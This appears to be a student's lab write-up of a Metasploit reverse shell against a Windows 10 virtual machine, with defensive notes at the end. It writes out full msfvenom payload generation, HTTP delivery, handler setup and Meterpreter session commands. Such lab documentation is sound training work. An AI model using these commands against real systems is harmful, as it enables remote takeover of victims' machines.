# Task 3: Metasploit Reverse Shell

## Objective

Create a malicious payload using Metasploit, deliver it to a Windows 10 virtual machine, and establish a reverse shell connection from the target system back to the attacker machine.

---

# Task Overview

This task demonstrates post-exploitation access by:

- Generating a reverse shell payload  
- Executing the payload on a Windows 10 system  
- Establishing a remote session from the attacker machine  

The attack was conducted in a controlled lab environment.

---

# Tools & Environment

### Attacker Machine

- Kali Linux  
- Metasploit Framework  
- Python3
- msfvenom  

### Victim Machine

- Windows 10 Virtual Machine  

### Network

- Host only network  (VMnet1)
- Successful communication between attacker and victim  

---

# Network Configuration

| Role | IP Address |
|------|-----------|
| Attacker (Kali) | `192.168.1.8` |
| Victim (Windows 10) | `192.168.56.11` |

---

# Step 1: Identify Attacker IP 

Identify the IP address of the attacker machine (Kali):

### Command

```
ipconfig
```

### Result

```
192.168.1.8
```

This IP address will be as the LHOST in payload generation.

### Evidence

**Attacker IP**

![Attacker IP](/assets/screenshots/02-intermediate/task-3/identify-attacker-ip.png)

---

# Step 2: Verify Connectivity to Target

Connectivity with the target was verified using ICMP:

### Command

```
ping -c 4 192.168.56.11
```

### Result 

- ICMP echo reply
- Target is a live host 
- Target is reachable

### Evidence

**Verified connectivity using ICMP** 

![ICMP](/assets/screenshots/02-intermediate/task-3/verify-connectivity-to-target.png)

---

# Step 3: Generate Payload

A reverse TCP Meterpreter payload was created using msfvenom.

### Command

```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=192.168.1.8 \
LPORT=4444 \
-f exe > shell.exe
```

### Output

```
Payload successfully generated as shell.exe
``` 

### Evidence 

**Generate Payload**

![Payload](/assets/screenshots/02-intermediate/task-3/payload-successfully-created.png)

---

# Step 4: Transfer Payload

The generated payload was transferred to the Windows 10 virtual machine.

Possible transfer methods include:

- Shared folders
- Local network transfer
- HTTP server

> For this lab, I used the HTTP server transfer method by leveraging Python3 to create a HTTP server  

## Procedure

### On Kali (Attacker Machine)

Start a Python HTTP server in the directory containing the payload:

```
python3 -m http.server 8000
``` 

This hosts the current directory over HTTP on port 8000

### On Windows (Victim Machine)

1. Open a web browser
2. Navigate to: http://192.168.1.8:8000
3. Locate and download the payload file: `shell.exe`
4. Save the file locally on the Windows machine

### Result
- Payload successfully transferred from Kali to Windows
- File `shell.exe` available on the victim system for execution

### Evidence

**HTTP server started on the attacker machine**

![HTTP Server](/assets/screenshots/02-intermediate/task-3/http-server.png)

**Payload present on the target machine**

![Payload on the Target](/assets/screenshots/02-intermediate/task-3/payload-present-on-windows.png)

---

# Step 5: Start Listener

Metasploit was launched and configured to listen for incoming connections.

### Commands

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.8
set LPORT 4444
run
```

### Result
Listener started successfully and awaited incoming connection

### Evidence

**Listener started on the attacker machine**

![Listener](/assets/screenshots/02-intermediate/task-3/listener-running-and-waiting.png)

---

# Step 5: Execute Payload on Windows

The payload (shell.exe) was executed on the Windows 10 virtual machine.

Possible Execution Methods:
- GUI Execution (Double tab or through `Open` menu option)
- CLI Execution (`.\shell.exe`)

### Result

- Payload executed successfully
- Connection initiated from victim to attacker

### Evidence

**Payload Executed**

![Payload Executed](/assets/screenshots/02-intermediate/task-3/payload-executed-on-the-target.png)

---

# Step 6: Establish Reverse Shell

Upon execution, a Meterpreter session was established.

### Output

```
[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.56.11:59478) at 2026-08-13 13:45:31 -0400
```

This confirms:

- The victim machine connected back to the attacker
- A reverse shell session was successfully created

### Evidence

**Reverse shell established**

![Reverse shell](/assets/screenshots/02-intermediate/task-3/reverse-shell-established.png)

# Step 7: Interact with Session

The session can be accessed using:

```
sessions -i 1
```

### Further interaction Commands:

```
sysinfo
getuid
pwd
ls
```

### Evidence

**Interacting with the session**

![Shell interaction](/assets/screenshots/02-intermediate/task-3/interact-with-session.png)

---

# Results Summary

| Stage                    | Result      |
| ------------------------ | ----------- |
| Payload generation       | Successful  |
| Payload execution        | Successful  |
| Listener setup           | Successful  |
| Reverse shell connection | Established |
| Meterpreter session      | Active      |

---

# Security Analysis

This task demonstrates how an attacker can gain remote access to a system through a reverse shell.

### Observations:

- The victim initiates the connection, bypassing inbound firewall restrictions
- Once connected, the attacker gains interactive control over the system
- Meterpreter provides advanced post-exploitation capabilities

---

# Security Considerations

### Endpoint Protection

Modern antivirus and endpoint detection systems are designed to detect and block such payloads.

### User Awareness

Execution of unknown files remains one of the most common attack vectors.

### Network Monitoring

Unusual outbound connections (e.g., to unknown IPs or known attacker-controlled IPs) can indicate compromise.

---

# Command Log

### Generate payload

```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=192.168.1.8 \
LPORT=4444 \
-f exe > shell.exe
```

### Start Metasploit handler

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.8
set LPORT 4444
run
```

### Interact with session

```
sessions -i 1
sysinfo
getuid
pwd
ls
```

--- 

# Conclusion

The reverse shell attack was successfully executed in a controlled lab environment.

A payload was generated using Metasploit, delivered to the Windows 10 system, and executed to establish a reverse shell connection. The attacker machine received the connection and successfully opened a Meterpreter session.

This demonstrates how attackers can gain remote access to systems through user-executed payloads and highlights the importance of endpoint security and user awareness.